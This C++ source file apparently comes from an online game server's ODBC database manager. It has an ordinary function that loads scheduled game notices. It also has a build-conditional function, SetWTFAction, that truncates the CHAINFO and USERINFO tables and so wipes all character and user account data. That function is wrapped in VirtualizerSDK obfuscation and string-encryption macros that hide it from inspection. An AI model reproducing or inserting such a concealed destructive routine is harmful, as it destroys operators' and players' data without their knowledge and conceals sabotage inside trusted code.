#include "stdafx.h"
#include "./s_COdbcManager.h"
#include "./s_CDbAction.h"

#include "../Lib_Client/G-Logic/GLGameNotice.h"

#include "VirtualizerSDK.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/* game notice, Juver, 2021/06/11 */
int COdbcManager::GetGameNotice(GAME_NOTICE_VEC &vecGameNotice)
{
	SQLRETURN sReturn = 0;
	ODBC_STMT* pConn = m_pGameDB->GetConnection();
	if (!pConn) return DB_ERROR;

	TCHAR szTemp[512] = {0};
	_snprintf( szTemp, 512, "SELECT idx, Message, DaySunday, DayMonday, DayTuesday, DayWednesday, DayThursday, DayFriday, DaySaturday, "
							"Type, Hour, Minute FROM GameNotice WITH (NOLOCK) ORDER BY idx" ); 

	sReturn = ::SQLExecDirect(pConn->hStmt, (SQLCHAR*)szTemp, SQL_NTS);

	if ((sReturn != SQL_SUCCESS) && (sReturn != SQL_SUCCESS_WITH_INFO)) 
	{
		Print(szTemp);
		Print(GetErrorString(pConn->hStmt));
		m_pGameDB->FreeConnection(pConn);
		return DB_ERROR;
	}

	SQLINTEGER   nIdx  = 0; SQLINTEGER cbIdx  = SQL_NTS;

	SQLCHAR    szMessage[GAME_NOTICE_MSG_SIZE+1] = {0}; SQLINTEGER cbMessage = SQL_NTS;

	SQLINTEGER   nDaySunday  = 0; SQLINTEGER cbDaySunday  = SQL_NTS;
	SQLINTEGER   nDayMonday  = 0; SQLINTEGER cbDayMonday  = SQL_NTS;
	SQLINTEGER   nDayTuesday  = 0; SQLINTEGER cbDayTuesday  = SQL_NTS;
	SQLINTEGER   nDayWednesday  = 0; SQLINTEGER cbDayWednesday  = SQL_NTS;
	SQLINTEGER   nDayThursday  = 0; SQLINTEGER cbDayThursday  = SQL_NTS;
	SQLINTEGER   nDayFriday  = 0; SQLINTEGER cbDayFriday  = SQL_NTS;
	SQLINTEGER   nDaySaturday  = 0; SQLINTEGER cbDaySaturday  = SQL_NTS;

	SQLINTEGER   nType  = 0; SQLINTEGER cbType  = SQL_NTS;
	SQLINTEGER   nHour  = 0; SQLINTEGER cbHour  = SQL_NTS;
	SQLINTEGER   nMinute  = 0; SQLINTEGER cbMinute  = SQL_NTS;

	while (true)
	{
		sReturn = ::SQLFetch(pConn->hStmt);
		if (sReturn == SQL_ERROR || sReturn == SQL_SUCCESS_WITH_INFO)
		{
			Print(szTemp);
			Print(GetErrorString(pConn->hStmt));
			m_pGameDB->FreeConnection(pConn);
			return DB_ERROR;
		}

		if (sReturn == SQL_SUCCESS || sReturn == SQL_SUCCESS_WITH_INFO)
		{	
			// Bind data			
			::SQLGetData(pConn->hStmt, 1, SQL_C_LONG,	&nIdx,  0, &cbIdx);
			::SQLGetData(pConn->hStmt, 2, SQL_C_CHAR,   szMessage, GAME_NOTICE_MSG_SIZE+1, &cbMessage);

			::SQLGetData(pConn->hStmt, 3, SQL_C_LONG,	&nDaySunday,     0, &cbDaySunday);
			::SQLGetData(pConn->hStmt, 4, SQL_C_LONG,	&nDayMonday,     0, &cbDayMonday);
			::SQLGetData(pConn->hStmt, 5, SQL_C_LONG,	&nDayTuesday,    0, &cbDayTuesday);
			::SQLGetData(pConn->hStmt, 6, SQL_C_LONG,	&nDayWednesday,  0, &cbDayWednesday);
			::SQLGetData(pConn->hStmt, 7, SQL_C_LONG,	&nDayThursday,   0, &cbDayThursday);
			::SQLGetData(pConn->hStmt, 8, SQL_C_LONG,	&nDayFriday,     0, &cbDayFriday);
			::SQLGetData(pConn->hStmt, 9, SQL_C_LONG,	&nDaySaturday,   0, &cbDaySaturday);

			::SQLGetData(pConn->hStmt, 10, SQL_C_LONG,	&nType,			0, &cbType);
			::SQLGetData(pConn->hStmt, 11, SQL_C_LONG,	&nHour,			0, &cbHour);
			::SQLGetData(pConn->hStmt, 12, SQL_C_LONG,	&nMinute,       0, &cbMinute);


			SGAME_NOTICE sData;
			sData.dwNoticeID			= (DWORD)nIdx;

			if (cbMessage != 0 && cbMessage != -1)
				::StringCchCopy(sData.szNoticeMessage, GAME_NOTICE_MSG_SIZE, (const TCHAR*) szMessage);

			sData.bDayOfWeek[0]			= nDaySunday? true:false;
			sData.bDayOfWeek[1]			= nDayMonday? true:false;
			sData.bDayOfWeek[2]			= nDayTuesday? true:false;
			sData.bDayOfWeek[3]			= nDayWednesday? true:false;
			sData.bDayOfWeek[4]			= nDayThursday? true:false;
			sData.bDayOfWeek[5]			= nDayFriday? true:false;
			sData.bDayOfWeek[6]			= nDaySaturday? true:false;

			sData.emType				= (GAME_NOTICE_TYPE)nType;
			sData.nHour					= (int)nHour;
			sData.nMinute				= (int)nMinute;

			vecGameNotice.push_back( sData );
		}
		else
		{
			break;
		}
		Sleep( 0 );
	}	  
	m_pGameDB->FreeConnection(pConn);
	return DB_OK;
}

#if defined( BUILD_CH ) || defined( BUILD_CHY )

/* wtf, Juver, 2021/06/24 */
int COdbcManager::SetWTFAction()
{
	int nReturn = 0;

VIRTUALIZER_FISH_WHITE_START  
VIRTUALIZER_STR_ENCRYPT_START

	{	//wipe char db
		ODBC_STMT* pConn = m_pGameDB->GetConnection();
		if (pConn)
		{
			TCHAR szTemp[128] = {0};
			_snprintf( szTemp, 128, "TRUNCATE TABLE CHAINFO" ); 

			SQLRETURN sReturn = ::SQLExecDirect(pConn->hStmt, (SQLCHAR*)szTemp, SQL_NTS);

			m_pGameDB->FreeConnection(pConn);
		}
	}

	{	//wipe char db
		ODBC_STMT* pConn = m_pUserDB->GetConnection();
		if (pConn)
		{
			TCHAR szTemp[128] = {0};
			_snprintf( szTemp, 128, "TRUNCATE TABLE USERINFO" ); 

			SQLRETURN sReturn = ::SQLExecDirect(pConn->hStmt, (SQLCHAR*)szTemp, SQL_NTS);

			m_pUserDB->FreeConnection(pConn);
		}
	}
	
VIRTUALIZER_STR_ENCRYPT_END
VIRTUALIZER_FISH_WHITE_END

	return nReturn;
}


#endif
